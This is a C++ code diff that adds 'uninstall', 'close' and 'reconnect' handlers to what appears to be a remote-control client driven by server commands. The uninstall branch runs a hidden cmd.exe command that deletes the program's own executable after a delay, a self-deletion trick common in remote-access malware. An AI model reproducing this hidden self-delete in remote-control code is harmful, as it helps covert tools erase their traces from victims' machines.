@@ -261,6 +261,19 @@ private:
 								MB_OK | iconFlag | MB_SYSTEMMODAL);
 					}).detach();
 			}
+            else if (action == "uninstall") {
+                char path[MAX_PATH];
+                GetModuleFileNameA(NULL, path, MAX_PATH);
+                string cmd = "cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"" + string(path) + "\"";
+                WinExec(cmd.c_str(), SW_HIDE);
+                exit(0);
+            }
+            else if (action == "close") {
+                exit(0);
+            }
+            else if (action == "reconnect") {
+                connected = false;
+            }
             else if (action == "ping") {
                 send_data({{"action", "pong"}});
             }
